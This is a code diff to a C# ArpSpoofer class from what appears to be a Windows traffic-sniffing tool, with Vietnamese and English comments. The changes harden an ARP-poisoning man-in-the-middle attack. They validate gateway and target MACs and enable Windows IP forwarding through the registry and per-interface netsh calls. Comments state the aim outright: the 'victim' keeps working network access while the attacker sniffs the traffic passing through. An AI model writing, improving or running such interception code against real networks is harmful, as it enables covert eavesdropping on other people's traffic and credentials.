@@ -70,6 +70,8 @@ public sealed class ArpSpoofer : IDisposable
     {
         _gatewayIp = IpToUint(gatewayIp);
         _gatewayMac = ParseMac(gatewayMac);
+        if (_gatewayMac.Length != 6 || _gatewayMac.All(b => b == 0))
+            throw new ArgumentException($"Invalid gateway MAC: '{gatewayMac}'. Ping the gateway first so its MAC enters the ARP cache, then use arp -a to get it.");
         _intervalMs = Math.Max(500, intervalMs);
         _attackerMac = _engine.GetSelectedAdapterMac();
         Log($"Configured: Gateway {gatewayIp} ({gatewayMac}), Interval {_intervalMs}ms ±{_jitterPercent * 100:F0}%");
@@ -191,6 +193,9 @@ public sealed class ArpSpoofer : IDisposable
     /// </summary>
     public void AddTarget(string targetIp, string targetMac)
     {
+        var mac = ParseMac(targetMac);
+        if (mac.Length != 6 || mac.All(b => b == 0))
+            throw new ArgumentException($"Invalid target MAC: '{targetMac}'. Ping the target first so its MAC enters the ARP cache.");
         lock (_lock)
         {
             if (_targets.Any(t => t.Ip == targetIp))
@@ -202,7 +207,7 @@ public sealed class ArpSpoofer : IDisposable
             {
                 Ip = targetIp,
                 IpUint = IpToUint(targetIp),
-                Mac = ParseMac(targetMac)
+                Mac = mac
             });
             Log($"Target added: {targetIp} ({targetMac})");
         }
@@ -228,13 +233,24 @@ public sealed class ArpSpoofer : IDisposable
     public void Start()
     {
         if (State == ArpSpoofState.Running)
-            throw new InvalidOperationException("ARP spoofing đang chạy.");
-        if (_gatewayIp == 0 || _gatewayMac.Length != 6)
-            throw new InvalidOperationException("Chưa configure gateway. Gọi Configure() trước.");
+            throw new InvalidOperationException("ARP spoofing is already running.");
+        if (_gatewayIp == 0 || _gatewayMac.Length != 6 || _gatewayMac.All(b => b == 0))
+            throw new InvalidOperationException("Gateway not configured. Call Configure() first.");
         if (_targets.Count == 0)
-            throw new InvalidOperationException("Chưa thêm target. Gọi AddTarget() trước.");
+            throw new InvalidOperationException("No targets added. Call AddTarget() first.");
 
-        // Bật IP Forwarding trước khi spoof — nếu không, nạn nhân mất kết nối
+        // Spoofed MAC + Windows IP Forwarding = guaranteed outage.
+        // The NIC hardware filter drops frames sent to an unknown MAC, so the Windows
+        // stack never receives the packets to forward them.
+        if (_spoofedMac != null)
+            throw new InvalidOperationException(
+                $"Using spoofed MAC {FormatMac(_spoofedMac)} — Windows IP Forwarding CANNOT forward packets sent to an unknown MAC, so the victim will lose connectivity. " +
+                "Call SetSpoofedMac(null) to use the adapter's real MAC, then Start again. " +
+                "Use a spoofed MAC only with a dedicated userspace relay (not currently supported).");
+
+        // Bật IP Forwarding trước khi spoof — hàm này tự verify per-interface,
+        // nếu không bật được thì throw để ABORT (không poison khi không forward được,
+        // vì poison mà không forward → nạn nhân mất kết nối).
         EnableIpForwarding();
 
         _attackerMac = _engine.GetSelectedAdapterMac();
@@ -472,68 +488,247 @@ public sealed class ArpSpoofer : IDisposable
     private const string IP_FORWARD_REG_PATH = @"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters";
     private const string IP_FORWARD_REG_KEY = "IPEnableRouter";
 
+    // Trạng thái forwarding per-interface trước khi spoof (để restore chính xác).
+    // true = đã enabled, false = đã disabled, null = không đọc được.
+    private readonly Dictionary<string, bool?> _ifForwardingBefore = new();
+
     /// <summary>
-    /// Bật Windows IP Forwarding qua registry + netsh.
+    /// Bật Windows IP Forwarding qua registry + netsh per-interface.
     /// Lưu lại trạng thái cũ để restore khi dừng spoof.
     ///
     /// Tại sao cần: sau ARP poison, traffic nạn nhân đến NIC attacker.
     /// Nếu IP forwarding tắt → Windows drop packet → nạn nhân mất mạng.
     /// Bật forwarding → Windows route packet đến đúng gateway → nạn nhân vẫn dùng mạng bình thường,
     /// attacker sniff được traffic đi qua.
+    ///
+    /// LƯU Ý: `netsh interface ipv4 show global` KHÔNG có dòng Forwarding
+    /// trên nhiều bản Windows — trạng thái thật nằm ở per-interface
+    /// (`netsh interface ipv4 show interface "Tên-Card-Mạng"` → dòng `Forwarding : enabled`).
     /// </summary>
     private void EnableIpForwarding()
     {
         try
         {
-            // Đọc trạng thái hiện tại từ registry
+            _ifForwardingBefore.Clear();
+
+            // Đọc trạng thái persistent từ registry
             using var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(IP_FORWARD_REG_PATH, writable: false);
             var value = key?.GetValue(IP_FORWARD_REG_KEY);
             _ipForwardingWasEnabled = value is int v && v == 1;
 
-            if (_ipForwardingWasEnabled)
+            // Ghi registry IPEnableRouter=1 để persistent sau reboot (cần Admin).
+            // Runtime vẫn cần netsh per-interface bên dưới.
+            try
             {
-                Log("IP Forwarding already enabled");
-                _ipForwardingChanged = false;
-                return;
+                using var wkey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(IP_FORWARD_REG_PATH, writable: true);
+                wkey?.SetValue(IP_FORWARD_REG_KEY, 1, Microsoft.Win32.RegistryValueKind.DWord);
             }
+            catch { /* best effort — netsh mới quyết định */ }
 
-            // Bật bằng netsh (có hiệu lực ngay, không cần reboot)
-            // Registry chỉ áp dụng sau reboot, netsh thay đổi runtime state
-            var psi = new System.Diagnostics.ProcessStartInfo("netsh", "interface ipv4 set global forwarding=enabled")
-            {
-                RedirectStandardOutput = true,
-                RedirectStandardError = true,
-                UseShellExecute = false,
-                CreateNoWindow = true
-            };
-            using var proc = System.Diagnostics.Process.Start(psi);
-            proc?.WaitForExit(5000);
+            // 1. Thử bật global forwarding (best-effort: tham số này không tồn tại
+            // trên một số bản Windows — per-interface bên dưới mới là phần bắt buộc).
+            var (exitGlobal, _, errGlobal) = RunNetsh("interface ipv4 set global forwarding=enabled");
+            if (exitGlobal != 0)
+                Log($"NOTE: global forwarding set skipped ({errGlobal.Trim()}), continuing with per-interface.");
 
-            if (proc?.ExitCode == 0)
-            {
-                _ipForwardingChanged = true;
-                Log("IP Forwarding ENABLED (will restore on stop)");
-            }
+            // 2. Bật per-interface forwarding cho mọi NIC đang Up.
+            // Đây là bước bắt buộc — thiếu nó Windows vẫn drop → nạn nhân mất mạng.
+            // Xác định interface đang sniff (khớp MAC với adapter đã chọn) để verify
+            // đúng card — các card ảo (VPN/VMware/VirtualBox) đang Up nhưng không liên
+            // quan không được làm fail cả quá trình.
+            string? targetIf = FindSniffingInterfaceName();
+            if (targetIf != null)
+                Log($"Sniffing interface: '{targetIf}' (MAC matched to selected adapter)");
             else
+                Log("NOTE: could not identify the sniffing interface by MAC — using relaxed verification.");
+
+            bool anySetOk = false;
+            bool? targetSetOk = null;
+            foreach (var nic in NetworkInterface.GetAllNetworkInterfaces())
             {
-                string err = proc?.StandardError.ReadToEnd() ?? "unknown error";
-                Log($"WARNING: Failed to enable IP Forwarding: {err}");
-                Log("  → Nạn nhân có thể mất kết nối mạng khi spoof!");
-                Log("  → Thử chạy thủ công: netsh interface ipv4 set global forwarding=enabled");
-                _ipForwardingChanged = false;
+                if (nic.OperationalStatus != OperationalStatus.Up) continue;
+                if (nic.NetworkInterfaceType == NetworkInterfaceType.Loopback) continue;
+
+                // Ghi nhận trạng thái trước khi đổi để restore chính xác
+                _ifForwardingBefore[nic.Name] = GetInterfaceForwarding(nic.Name);
+
+                // Dùng tên interface trong ngoặc kép vì có thể chứa khoảng trắng
+                var (exitIf, _, errIf) = RunNetsh($"interface ipv4 set interface \"{nic.Name}\" forwarding=enabled");
+                bool ok = exitIf == 0;
+                if (nic.Name == targetIf) targetSetOk = ok;
+                if (ok)
+                {
+                    anySetOk = true;
+                    Log($"IP forwarding enabled on interface '{nic.Name}' (was: {FormatTriState(_ifForwardingBefore[nic.Name])})");
+                }
+                else
+                {
+                    Log($"WARNING: cannot enable forwarding on '{nic.Name}': {errIf.Trim()}");
+                }
             }
+
+            if (targetIf != null && targetSetOk == false)
+                throw new InvalidOperationException(
+                    $"Could not enable forwarding on the sniffing interface '{targetIf}' (other virtual adapters don't matter). " +
+                    "Run the tool as Administrator. " +
+                    $"Try manually: netsh interface ipv4 set interface \"{targetIf}\" forwarding=enabled");
+
+            if (!anySetOk)
+                throw new InvalidOperationException(
+                    "Could not enable forwarding on any interface (all netsh calls failed). " +
+                    "Run the tool as Administrator. " +
+                    "Try manually: netsh interface ipv4 set interface \"Wi-Fi\" forwarding=enabled");
+
+            // 3. Verify runtime state per-interface (only the sniffing NIC is mandatory)
+            var verify = VerifyInterfacesForwarding(targetIf);
+            if (verify == false)
+                throw new InvalidOperationException(
+                    targetIf != null
+                        ? $"Sniffing interface '{targetIf}' still reports forwarding disabled (it may be reverted by GPO immediately). " +
+                          $"Check manually: netsh interface ipv4 show interface \"{targetIf}\" — the Forwarding line must be enabled."
+                        : "No interface has forwarding enabled (all still disabled). " +
+                          "Check manually: netsh interface ipv4 show interface \"Wi-Fi\" — the Forwarding line must be enabled.");
+            if (verify == null)
+                Log("WARNING: could not read back the forwarding state for verification (netsh show output not parseable) — " +
+                    "netsh set reported success so continuing. If the victim loses connectivity, stop spoofing immediately.");
+
+            _ipForwardingChanged = true;
+            Log(_ipForwardingWasEnabled
+                ? "IP Forwarding verified (per-interface enabled)"
+                : "IP Forwarding ENABLED (per-interface, will restore on stop)");
+        }
+        catch (InvalidOperationException)
+        {
+            _ipForwardingChanged = false;
+            throw; // để Start() abort, không poison khi không forward được
         }
         catch (Exception ex)
         {
-            Log($"WARNING: Cannot check/enable IP Forwarding: {ex.Message}");
-            Log("  → Nạn nhân có thể mất kết nối mạng khi spoof!");
             _ipForwardingChanged = false;
+            throw new InvalidOperationException(
+                $"Could not enable IP Forwarding: {ex.Message}. " +
+                "The victim will lose connectivity if spoofing continues — aborted. " +
+                "Try manually (Admin): netsh interface ipv4 set interface \"Wi-Fi\" forwarding=enabled", ex);
         }
     }
 
     /// <summary>
+    /// Đọc trạng thái forwarding runtime của 1 interface qua
+    /// `netsh interface ipv4 show interface "Name"` (dòng `Forwarding : enabled|disabled`).
+    /// Trả về null nếu không đọc/parse được.
+    /// </summary>
+    private static bool? GetInterfaceForwarding(string ifName)
+    {
+        try
+        {
+            var (exit, stdout, _) = RunNetsh($"interface ipv4 show interface \"{ifName}\"");
+            if (exit != 0) return null;
+            foreach (var line in stdout.Split('\n'))
+            {
+                var t = line.Trim();
+                int colon = t.IndexOf(':');
+                if (colon < 0) continue;
+                var k = t[..colon].Trim();
+                var val = t[(colon + 1)..].Trim();
+                if (k.Equals("Forwarding", StringComparison.OrdinalIgnoreCase))
+                {
+                    if (val.Equals("enabled", StringComparison.OrdinalIgnoreCase)) return true;
+                    if (val.Equals("disabled", StringComparison.OrdinalIgnoreCase)) return false;
+                    return null;
+                }
+            }
+            return null;
+        }
+        catch { return null; }
+    }
+
+    /// <summary>
+    /// Tìm tên Windows interface đang sniff bằng cách khớp MAC với adapter đã chọn
+    /// trong capture engine. Trả về null nếu chưa chọn adapter hoặc không khớp.
+    /// </summary>
+    private string? FindSniffingInterfaceName()
+    {
+        try
+        {
+            byte[] selMac = _engine.GetSelectedAdapterMac();
+            if (selMac.Length != 6) return null;
+            foreach (var nic in NetworkInterface.GetAllNetworkInterfaces())
+            {
+                if (nic.OperationalStatus != OperationalStatus.Up) continue;
+                if (nic.NetworkInterfaceType == NetworkInterfaceType.Loopback) continue;
+                try
+                {
+                    byte[] mac = nic.GetPhysicalAddress().GetAddressBytes();
+                    if (mac.Length == 6 && mac.SequenceEqual(selMac))
+                        return nic.Name;
+                }
+                catch { /* bỏ qua NIC lỗi đọc MAC */ }
+            }
+        }
+        catch { /* chưa chọn adapter — fallback verify nới lỏng */ }
+        return null;
+    }
+
+    /// <summary>
+    /// Verify tất cả NIC đang Up. Nếu biết card đang sniff (targetIf) thì chỉ check
+    /// đúng card đó. Ngược lại: true = có ít nhất 1 interface enabled;
+    /// false = tất cả đều disabled; null = không đọc được.
+    /// </summary>
+    private bool? VerifyInterfacesForwarding(string? targetIf)
+    {
+        var states = new List<(string name, bool? st)>();
+
+        foreach (var nic in NetworkInterface.GetAllNetworkInterfaces())
+        {
+            if (nic.OperationalStatus != OperationalStatus.Up) continue;
+            if (nic.NetworkInterfaceType == NetworkInterfaceType.Loopback) continue;
+
+            var st = GetInterfaceForwarding(nic.Name);
+            states.Add((nic.Name, st));
+            Log($"  verify '{nic.Name}': forwarding={FormatTriState(st)}");
+        }
+
+        // Biết card đang sniff → chỉ check card đó, card ảo khác kệ
+        if (targetIf != null)
+        {
+            foreach (var s in states)
+                if (s.name == targetIf) return s.st;
+        }
+
+        bool anyEnabled = states.Any(s => s.st == true);
+        bool anyDisabled = states.Any(s => s.st == false);
+        if (anyEnabled)
+        {
+            if (anyDisabled)
+                Log("NOTE: a few other interfaces still report disabled, but they are not the sniffing NIC — ignoring.");
+            return true;
+        }
+        if (anyDisabled) return false;
+        return null; // không đọc được / không có NIC nào để check
+    }
+
+    private static string FormatTriState(bool? v) => v == true ? "enabled" : v == false ? "disabled" : "unknown";
+
+    private static (int exitCode, string stdout, string stderr) RunNetsh(string args)
+    {
+        var psi = new System.Diagnostics.ProcessStartInfo("netsh", args)
+        {
+            RedirectStandardOutput = true,
+            RedirectStandardError = true,
+            UseShellExecute = false,
+            CreateNoWindow = true
+        };
+        using var proc = System.Diagnostics.Process.Start(psi)
+            ?? throw new InvalidOperationException("Could not start netsh.");
+        string stdout = proc.StandardOutput.ReadToEnd();
+        string stderr = proc.StandardError.ReadToEnd();
+        proc.WaitForExit(5000);
+        return (proc.ExitCode, stdout, stderr);
+    }
+
+    /// <summary>
     /// Restore IP Forwarding về trạng thái trước khi spoof.
-    /// Chỉ tắt nếu ban đầu nó đang tắt — không phá cấu hình routing có sẵn.
+    /// Chỉ tắt những interface mà trước đó đang tắt — không phá cấu hình routing có sẵn.
     /// </summary>
     private void RestoreIpForwarding()
     {
@@ -541,23 +736,25 @@ public sealed class ArpSpoofer : IDisposable
 
         try
         {
-            var psi = new System.Diagnostics.ProcessStartInfo("netsh", "interface ipv4 set global forwarding=disabled")
+            // Restore per-interface: chỉ disable những interface mà trước đó là disabled
+            foreach (var kv in _ifForwardingBefore)
             {
-                RedirectStandardOutput = true,
-                RedirectStandardError = true,
-                UseShellExecute = false,
-                CreateNoWindow = true
-            };
-            using var proc = System.Diagnostics.Process.Start(psi);
-            proc?.WaitForExit(5000);
-
-            if (proc?.ExitCode == 0)
-            {
-                Log("IP Forwarding restored to DISABLED");
+                if (kv.Value != false) continue; // trước đó đã enabled/unknown → để nguyên
+                var (exit, _, _) = RunNetsh($"interface ipv4 set interface \"{kv.Key}\" forwarding=disabled");
+                Log(exit == 0
+                    ? $"IP Forwarding restored to DISABLED on '{kv.Key}'"
+                    : $"WARNING: Failed to restore forwarding on '{kv.Key}'. Run manually: netsh interface ipv4 set interface \"{kv.Key}\" forwarding=disabled");
             }
-            else
+
+            // Restore registry nếu ban đầu đang tắt
+            if (!_ipForwardingWasEnabled)
             {
-                Log("WARNING: Failed to restore IP Forwarding. Run manually: netsh interface ipv4 set global forwarding=disabled");
+                try
+                {
+                    using var wkey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(IP_FORWARD_REG_PATH, writable: true);
+                    wkey?.SetValue(IP_FORWARD_REG_KEY, 0, Microsoft.Win32.RegistryValueKind.DWord);
+                }
+                catch { /* best effort */ }
             }
 
             _ipForwardingChanged = false;
